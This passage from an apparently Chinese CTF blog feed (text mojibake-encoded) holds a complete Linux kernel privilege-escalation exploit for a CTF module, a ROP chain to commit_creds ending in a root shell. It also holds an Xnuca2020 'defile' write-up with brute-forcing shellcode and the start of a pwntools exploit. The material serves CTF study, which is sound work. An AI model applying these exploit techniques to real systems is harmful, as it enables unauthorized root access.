class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span>c</span><br><span class="line">    <span class="type">void</span> *rip;</span><br><span class="line">    <span class="type">uint64_t</span> cs;</span><br><span class="line">    <span class="type">uint64_t</span> rflags;</span><br><span class="line">    <span class="type">void</span> * rsp;</span><br><span class="line">    <span class="type">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds_offset = <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred_offset = <span class="number">0x9cce0</span>;</span><br><span class="line"><span class="type">uint64_t</span> canary = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> rbp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> prdi_ret = <span class="number">0x0b2f</span>; <span class="comment">//: pop rdi; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rcx = <span class="number">0x1ae978</span>; <span class="comment">//: mov rdi, rax; jmp rcx;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rdx = <span class="number">0x6a6d2</span>; <span class="comment">//: mov rdi, rax; jmp rdx;</span></span><br><span class="line"><span class="type">uint64_t</span> prcx_ret = <span class="number">0x21e53</span>; <span class="comment">//: pop rcx; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> swapgs_p_ret = <span class="number">0xa012da</span>; <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> iretq_ret = <span class="number">0x50ac2</span>; <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">get_kernel_base</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_base1=<span class="number">0</span>,kernel_base2=<span class="number">0</span>;</span><br><span class="line">    fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open kallsyms fialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        fgets(line,<span class="number">0x30</span>,fd);</span><br><span class="line">        <span class="keyword">if</span>(kernel_base!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">            kernel_base1=commit_creds-commit_creds_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(kernel_base1!=<span class="number">0</span>&amp;&amp;kernel_base1==kernel_base2)&#123;</span><br><span class="line">            kernel_base=kernel_base1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x40</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buffer);</span><br><span class="line">    canary=*(<span class="type">uint64_t</span> *)buffer;</span><br><span class="line">    rbp=*(<span class="type">uint64_t</span> *)(buffer+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: %p\n&quot;</span>,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_gadget_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prdi_ret += kernel_base;</span><br><span class="line">    prcx_ret += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rcx += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rdx += kernel_base;</span><br><span class="line">    swapgs_p_ret += kernel_base;</span><br><span class="line">    iretq_ret += kernel_base;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)</span><br><span class="line">       :</span><br><span class="line">       :<span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">bool</span> ret = get_kernel_base();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x800</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leak(fd);</span><br><span class="line">    set_gadget_addr();</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">uint64_t</span> *ptr;</span><br><span class="line">    ptr = (<span class="type">uint64_t</span> *)(buffer+<span class="number">0x40</span>);</span><br><span class="line">    *(ptr + i++) = canary;</span><br><span class="line">    *(ptr + i++) = rbp;</span><br><span class="line">    *(ptr + i++) = prdi_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">    *(ptr + i++) = prcx_ret;</span><br><span class="line">    *(ptr + i++) = commit_creds;</span><br><span class="line">    *(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">    *(ptr + i++) = swapgs_p_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = iretq_ret;</span><br><span class="line">    *(ptr + i++) = (<span class="type">uint64_t</span>) launch_shell;</span><br><span class="line">    *(ptr + i++) = tf.cs;</span><br><span class="line">    *(ptr + i++) = tf.rflags;</span><br><span class="line">    *(ptr + i++) = tf.rsp;</span><br><span class="line">    *(ptr + i++) = tf.ss;</span><br><span class="line"></span><br><span class="line">    write(fd,buffer,<span class="number">0x800</span>);</span><br><span class="line">    <span class="type">uint64_t</span> len=<span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="type">uint32_t</span> l=<span class="number">0x100</span>;</span><br><span class="line">    len|=l;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ç‚¹è¡¥å……ï¼š<br>é™æ€ç¼–è¯‘exp(å†…æ ¸æ²¡æœ‰cåº“):<br><code>gcc exp.c -static -o exploit</code></p><p>æŸ¥æ‰¾gadgetæŒ‡ä»¤ï¼š<br><code>ROPgadget --binary vmlinux &gt; ropgadget</code></p><p>è°ƒè¯•æ–¹æ³•ï¼š<br>.shè„šæœ¬é‡Œæœ‰-sæˆ‘ä»¬å¯ä»¥é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234</span><br><span class="line">add-symbol-file core.ko 0xffffffffc0000000  (è¯¥textçš„åŸºåœ°å€é€šè¿‡cat /sys/module/core/sections/.textå¾—åˆ°)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç›´æ¥æ ¹æ®æ¨¡å—é‡Œçš„å‡½æ•°åä¸‹æ–­äº†ã€‚</p><p>ä½†åˆä¸€ç‚¹å¾ˆç–‘æƒ‘çš„æ—¶pwngdbè°ƒå†…æ ¸ç©ºé—´å·¨å¡ï¼Œè€Œä¸”si&#x2F;niç›´æ¥è·‘é£äº†ğŸ¤¦ï¼Œåªèƒ½ä¸‹æ–­ç‚¹å†cè¿™æ ·è°ƒï¼Œruanå¸ˆå‚…è¯´gefè°ƒèµ·æ¥å¾ˆå¿«ï¼Œå¾—å†å»æä¸ªgefæ¥ã€‚</p><p>å‚è€ƒåšå®¢ï¼ˆæ„Ÿè°¢ï¼‰ï¼š<br><a href="https://f5.pm/go-26809.html">https://f5.pm/go-26809.html</a><br><a href="https://www.cnblogs.com/T1e9u/p/13805760.html">https://www.cnblogs.com/T1e9u/p/13805760.html</a><br><a href="https://www.freebuf.com/articles/system/227357.html">https://www.freebuf.com/articles/system/227357.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xnuca2020çº¿ä¸Šèµ›l</title>
      <link href="/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Xnuca2020çº¿ä¸Šèµ›"><a href="#Xnuca2020çº¿ä¸Šèµ›" class="headerlink" title="Xnuca2020çº¿ä¸Šèµ›"></a>Xnuca2020çº¿ä¸Šèµ›</h3><blockquote><p>æ¯”èµ›æ—¶pwné¢˜éƒ½æ˜¯ruanè§£çš„tttttqlğŸ˜ï¼Œæˆ‘TMç›´æ¥åŒ–èº«ruanå¸ˆå‚…è¿·å¼Ÿã€‚ä¸äºæ˜¯ä¸­ç§‘é™¢ï¼Œæ”¶è·æ»¡æ»¡ã€‚</p></blockquote><span id="more"></span><h4 id="defile"><a href="#defile" class="headerlink" title="defile"></a>defile</h4><p>è¿™é¢˜åœ¨å¬äº†ruanå¸ˆå‚…è®²è§£ä¹‹åæ‰ç»ˆäºææ˜ç™½äº†ğŸ™†â€â™‚ï¸<br>é¢˜ç›®ç»™å‡ºäº†æºç ï¼Œç¼–è¯‘å¥½çš„elfæ–‡ä»¶ï¼Œmakefileï¼ŒæŸ¥çœ‹makefileå‘ç°<code>gcc defile.c -o defile -lseccomp -g</code>ï¼Œå¼€äº†seccompä»¥åŠç»™å‡ºäº†è°ƒè¯•ç¬¦å·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æºç è°ƒè¯•äº†ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯é˜…è¯»æºä»£ç äº†ï¼Œé€»è¾‘å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼ˆå¦‚æœ‰é”™è¯¯è¯·åŠ¡å¿…æŒ‡æ­£ï¼‰ï¼š<br>ç¨‹åºé¦–å…ˆmmapä¸€å—è¾ƒå¤§(4096)çš„sharedç©ºé—´ï¼Œæ¥ä¸‹æ¥forkå‡ºå­è¿›ç¨‹ã€‚è¯¥å­è¿›ç¨‹çš„ä»»åŠ¡æ˜¯é¦–å…ˆè®©æˆ‘ä»¬å‘sharedè¾“å…¥4094å¤§å°çš„å†…å®¹ï¼Œä¹‹åå¾ªç¯(while(1))çš„forkå‡ºå­™å­è¿›ç¨‹(ç›¸å¯¹äºçˆ¶è¿›ç¨‹è€Œè¨€)ï¼Œforkå‡ºçš„å­™å­è¿›ç¨‹ä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¾“å…¥ä¹Ÿå³shellcodeï¼Œæ‰§è¡Œå®Œåå°±exit(0)ï¼Œä¹‹åå­è¿›ç¨‹åœ¨ç»§ç»­forkï¼Œå¾ªç¯ä¸Šè¿°çš„æ‰§è¡Œã€‚</p><p>è¿™é‡Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯å†å­™å­è¿›ç¨‹è·³å»æ‰§è¡Œshellcodeçš„æ—¶å€™:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> targetaddr = (<span class="type">uint64_t</span>)shared + (i % <span class="number">2</span>) * ((<span class="number">4096</span> - <span class="number">2</span>) / <span class="number">2</span>);</span><br><span class="line">                __asm__(</span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rax\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rbx\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rcx\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rdi\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%rsi\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r8\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r9\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r10\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r11\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r12\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r13\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r14\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;mov $0xdeadbeefdeadbeef, %%r15\n\t&quot;</span></span><br><span class="line">                    <span class="string">&quot;jmp *%%rdx\n\t&quot;</span></span><br><span class="line">                    :</span><br><span class="line">                    :<span class="string">&quot;d&quot;</span>(targetaddr)</span><br><span class="line">                    :</span><br><span class="line">                );</span><br></pre></td></tr></table></figure><p>å¯è§æ˜¯æœ‰ä¸¤ä¸ªå…¥å£åœ°å€çš„ä¸€ä¸ªæ˜¯sharedï¼Œå¦ä¸€ä¸ªæ˜¯shared+2046ï¼Œä¹Ÿå³4096çš„ç©ºé—´é‡Œåº”è¯¥æœ‰æˆ‘ä»¬ä¸¤éƒ¨åˆ†ç›¸åŒçš„shellcodeã€‚</p><p>çˆ¶è¿›ç¨‹æ‰€ä½œçš„å°±æ˜¯é€šè¿‡randomç”Ÿæˆä¸€æ®µ128é•¿åº¦çš„éšæœºæ•°ï¼Œå¹¶ä¸”è¿›è¡Œ128è½®æ¬¡çš„å¾ªç¯ã€‚æ¯ä¸€è½®æ‰€åšçš„å°±æ˜¯æ¯”è¾ƒshared+4095å’Œkey[i]çš„å¤§å°ï¼Œå¦‚æœç›¸ç­‰å°±å¾€shared+offset(ä¹Ÿæ˜¯éšæœºæ•°)å†™å…¥0xccccccccccccccccæ¥ç ´åæˆ‘ä»¬çš„shellcodeï¼Œç„¶åå†æ¯”è¾ƒshared+0x4094æ˜¯å¦ä¸º1ï¼Œç›¸ç­‰åˆ™æ‰è¿›è¡Œä¸‹ä¸€è½®çš„æ¯”è¾ƒã€‚æ‰§è¡Œå®Œ128è½®ä¹‹åç¨‹åºä¼šä»pipeé‡Œè¯»å‡º128çš„å†…å®¹äºkeyæ¯”è¾ƒï¼Œç›¸åŒå°±ç»™æˆ‘ä»¬flagäº†ã€‚</p><p>è¿™æ ·çœ‹ä¸‹æ¥æˆ‘ä»¬çš„shellcodeæ‰€è¦å®Œæˆçš„åŠŸèƒ½ä¸ºï¼š</p><p>1.shared+4095&#x3D;&#x3D;key[i]ï¼Œéœ€è¦å¾ªç¯çˆ†ç ´ã€‚</p><p>2.shared+4095&#x3D;&#x3D;1</p><p>3.write(pipe,&amp;key[i],1)ã€‚</p><p>ç”±äº0xccccccccccccccccçš„å†™å…¥æˆ‘ä»¬å¯ä»¥æœ‰è¿™æ ·çš„æ€è·¯ï¼š<br>é¦–å…ˆä»0å¼€å§‹å¾ªç¯å¢åŠ çš„å‘shared+4095å†™å…¥ï¼Œæ¯æ¬¡å†™å…¥ä¹‹åéƒ½å¯¹shellcodeè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ²¡æœ‰0xccccccccccccccccçš„å‡ºç°è¯´æ˜è¿˜æ²¡çˆ†ç ´åˆ°ï¼Œè‹¥æœ‰0xccccccccccccccccè¯´æ˜çˆ†ç ´åˆ°äº†keyï¼Œä¹‹åç”±äºæˆ‘ä»¬å†è¯¥ç©ºé—´å†…æœ‰ä¸¤ç«¯ç›¸åŒçš„shellcodeï¼Œå› æ­¤å¯ä»¥é€šè¿‡åç§»çš„ç›¸å¯¹ä½ç½®åˆ©ç”¨æœªè¢«å†™å…¥0xccccccccccccccccçš„é‚£æ®µæ¥ä¿®å¤å†™å…¥0xccccccccccccccccçš„é‚£æ®µshellcodeï¼Œä¹‹åæ„é€ write(pipe,&amp;key[i],1)å‘ç®¡é“å†™å…¥Keyå€¼ï¼Œä¹‹åexit()ã€‚</p><p>å¯¹åº”çš„æ±‡ç¼–å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">code = &quot;&quot;&quot;</span><br><span class="line">and rdx,0xfffffffffffff000</span><br><span class="line">add rdx,0xe</span><br><span class="line">jmp rdx</span><br><span class="line">xor rbx,rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">and rdx,0xfffffffffffff000</span><br><span class="line">mov byte ptr [rdx+0xfff],bl</span><br><span class="line">loop_:</span><br><span class="line">call check</span><br><span class="line">mfence</span><br><span class="line">call check</span><br><span class="line">cmpw cx,0x200</span><br><span class="line">jne find</span><br><span class="line">inc bl</span><br><span class="line">mov byte ptr [rdx+0xfff],bl</span><br><span class="line">cmpb bl,0</span><br><span class="line">jne loop_</span><br><span class="line">find:</span><br><span class="line">mov ax,cx</span><br><span class="line">cmpw cx,0x100</span><br><span class="line">jle l1</span><br><span class="line">sub ax,0x100</span><br><span class="line">jmp l2</span><br><span class="line">l1:</span><br><span class="line">add ax,0x100</span><br><span class="line">l2:</span><br><span class="line">mov r11,[rdx+rax*8]</span><br><span class="line">mov qword ptr [rdx+rcx*8],r11</span><br><span class="line">push rbx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov edi,4</span><br><span class="line">mov r12,rdx</span><br><span class="line"></span><br><span class="line">xor rdx,rdx</span><br><span class="line">inc rdx</span><br><span class="line">mov rax,rdx</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov byte ptr [r12+0xffe],1</span><br><span class="line"></span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rax,0xe7</span><br><span class="line">syscall</span><br><span class="line">check:</span><br><span class="line">xor rcx,rcx</span><br><span class="line">find_cc:</span><br><span class="line">movabsqr11,-3689348814741910324</span><br><span class="line">cmpq qword ptr [rdx + rcx*8],r11</span><br><span class="line">je find_</span><br><span class="line">inc rcx</span><br><span class="line">cmpw cx,0x200</span><br><span class="line">jne find_cc</span><br><span class="line">ret</span><br><span class="line">find_:</span><br><span class="line">ret</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>å¼€å§‹çš„æ—¶å€™æˆ‘ä»¬åªcall checkäº†ä¸€æ¬¡ï¼Œè¿™æ ·ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜å°±æ˜¯å½“æˆ‘ä»¬çˆ†ç ´åˆ°äº†keyä½†call checkæ—¶ï¼Œçˆ¶è¿›ç¨‹è¿˜æ²¡å®Œæˆ0xccccccccccccccccçš„å†™å…¥å¯¼è‡´call checkè¿”å›0ï¼Œä½¿å¾—å†™å…¥çš„shared+4095ä¼šæ¯”keyå¤§1ï¼Œä¸ºäº†è§£å†³çˆ¶å­è¿›ç¨‹è¿™ç§å¯èƒ½çš„é€Ÿåº¦å·®å¼‚ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨äº†ä¸¤æ¬¡call checkã€‚</p><p>å®Œæ•´exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span 